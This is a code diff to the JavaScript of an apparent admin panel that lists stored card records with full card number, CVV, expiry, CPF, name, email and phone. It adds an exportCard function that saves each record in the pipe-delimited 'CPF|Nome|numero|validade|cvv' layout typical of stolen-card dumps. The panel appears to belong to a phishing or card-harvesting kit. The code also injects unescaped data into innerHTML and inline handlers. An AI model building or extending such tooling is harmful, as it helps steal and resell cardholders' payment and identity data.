@@ -179,46 +179,68 @@
     }
 
     function renderCards() {
-  const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
-  if (!cards.length) {
-    cardsBox.innerHTML = '<p class="muted">Nenhum cartao de teste registrado ainda.</p>';
-    return;
-  }
+      const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
+      if (!cards.length) {
+        cardsBox.innerHTML = '<p class="muted">Nenhum cartao de teste registrado ainda.</p>';
+        return;
+      }
 
-  cardsBox.innerHTML = `
-    <table>
-      <thead>
-        <tr>
-          <th>Data</th>
-          <th>CPF</th>
-          <th>Nome</th>
-          <th>Número do Cartão</th>
-          <th>CVV</th>
-          <th>Validade</th>
-          <th>Valor</th>
-          <th>Status</th>
-          <th>Ações</th>
-        </tr>
-      </thead>
-      <tbody>
-        ${cards.map((card) => `
-          <tr data-card-id="${card.createdAt}">
-            <td data-label="Data">${new Date(card.createdAt).toLocaleString('pt-BR')}</td>
-            <td data-label="CPF">${card.cpf || '-'}</td>
-            <td data-label="Nome">${card.holder || '-'}</td>
-            <td data-label="Número">${card.cardNumber || `${card.brand || 'Cartao'} final ${card.last4 || '----'}`}</td>
-            <td data-label="CVV">${card.cvv || '-'}</td>
-            <td data-label="Validade">${card.expiry || '-'}</td>
-            <td data-label="Valor">${money(card.amount)}</td>
-            <td data-label="Status">${card.status || '-'}</td>
-            <td data-label="Ações">
-              <button type="button" class="export-card" data-cpf="${card.cpf}" data-holder="${card.holder}" data-card="${card.cardNumber}" data-expiry="${card.expiry}" data-cvv="${card.cvv}">Exportar</button>
-            </td>
-          </tr>
-        `).join('')}
-      </tbody>
-    </table>
-  `;
+      cardsBox.innerHTML = `
+        <table>
+          <thead>
+            <tr>
+              <th>Data</th>
+              <th>Titular</th>
+              <th>Email</th>
+              <th>Telefone</th>
+              <th>CPF</th>
+              <th>Cartao (Completo)</th>
+              <th>CVV</th>
+              <th>Validade</th>
+              <th>Valor</th>
+              <th>Status</th>
+              <th>Exportar</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${cards.map((card) => `
+              <tr>
+                <td data-label="Data">${new Date(card.createdAt).toLocaleString('pt-BR')}</td>
+                <td data-label="Titular">${card.holder || '-'}</td>
+                <td data-label="Email">${card.email || '-'}</td>
+                <td data-label="Telefone">${card.phone || '-'}</td>
+                <td data-label="CPF">${card.cpf || '-'}</td>
+                <td data-label="Cartao">${card.cardNumber || '-'}</td> 
+                <td data-label="CVV">${card.cvv || '-'}</td>
+                <td data-label="Validade">${card.expiry || '-'}</td>
+                <td data-label="Valor">${money(card.amount)}</td>
+                <td data-label="Status">${card.status || '-'}</td>
+                <td data-label="Exportar">
+                  <button class="secondary" style="padding: 5px 10px; font-size: 12px;" 
+                    onclick="exportCard('${card.cpf}', '${card.holder}', '${card.cardNumber}', '${card.expiry}', '${card.cvv}')">
+                    Baixar
+                  </button>
+                </td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
+      `;
+    
+
+ window.exportCard = function(cpf, holder, number, expiry, cvv) {
+      // Formato solicitado: CPF|Nome|numero|validade|cvv
+      const content = `${cpf}|${holder}|${number}|${expiry}|${cvv}`;
+      const blob = new Blob([content], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `cartao_${cpf.slice(-4)}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    };
 
   // Adicionar evento ao botão de exportar
   document.querySelectorAll('.export-card').forEach((button) => {
